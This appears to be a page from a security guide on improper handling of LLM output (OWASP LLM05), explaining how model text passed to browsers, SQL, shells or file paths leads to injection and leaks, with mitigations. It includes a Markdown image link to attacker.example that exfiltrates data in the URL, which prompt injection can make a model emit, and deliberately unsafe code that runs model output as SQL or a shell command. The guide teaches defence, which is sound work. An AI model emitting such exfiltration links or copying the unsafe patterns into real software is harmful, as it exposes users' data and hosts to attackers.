# Improper Output Handling

Improper output handling (LLM05) happens when an application passes model output to another component without validating or encoding it. The output is text that an attacker can influence through prompt injection or user input, so it has to be treated like any other untrusted input.

The risk comes from interpretation. The output may be read as HTML by a browser, as SQL by a database, as a command by a shell, as a path by a file system, or as a URL that gets fetched.

## Examples

```text
Model output → rendered as HTML      → cross-site scripting (XSS)
Model output → used as SQL           → data read, changed or deleted
Model output → passed to a shell     → arbitrary commands run on the host
Model output → Markdown image link   → data sent to an attacker's server in the URL
Model output → used as a file path   → files outside the allowed folder read or overwritten
Model output → parsed without checks → crashes, or wrong values accepted
```

The Markdown case is easy to miss. If a chat interface renders `![](https://attacker.example/x?data=...)`, the browser requests that URL automatically, and whatever the model put into the query string leaves with it.

## Unsafe and Safer Code

```python
# Unsafe: the model decides the SQL and the shell command
cursor.execute(llm_output)
os.system(f"convert {llm_output}")

# Safer: the model only supplies values, and the code controls the structure
customer_id = int(model_choice)  # validated as an integer first
cursor.execute("SELECT * FROM orders WHERE customer_id = ?", (customer_id,))
subprocess.run(["convert", validated_filename], check=True)  # no shell involved
```

## How to Avoid It

- **Treat output as untrusted.** Encode it for the place where it is used: escape it for HTML, use parameterized queries for SQL, and pass shell arguments as a list without a shell.
- **Validate against a schema.** Check types, ranges, allowed values and permitted actions. [Structured outputs](../01-ai-foundations/02-prompt-engineering.md#prompting-patterns) make this easier because they constrain the shape of the response.
- **Limit the downstream systems.** Use read-only database roles and a dedicated folder for file writes, so a bad value has little room to do damage.
- **Sanitize rendered content.** Strip scripts, restrict which URLs and images are rendered, and don't fetch external resources automatically.
- **Run generated code in a sandbox,** never directly on the host.
- **Review outputs that have effects.** Database changes, emails, deployments and payments need an explicit approval step. See [Human in the Loop](../02-agentic-engineering/05-security.md#human-in-the-loop).

## Related Notes

- [Prompt Injection](01-prompt-injection.md), which is how an attacker gets to choose the output
- [Tools](../01-ai-foundations/05-tools.md), where tool arguments written by the model are executed
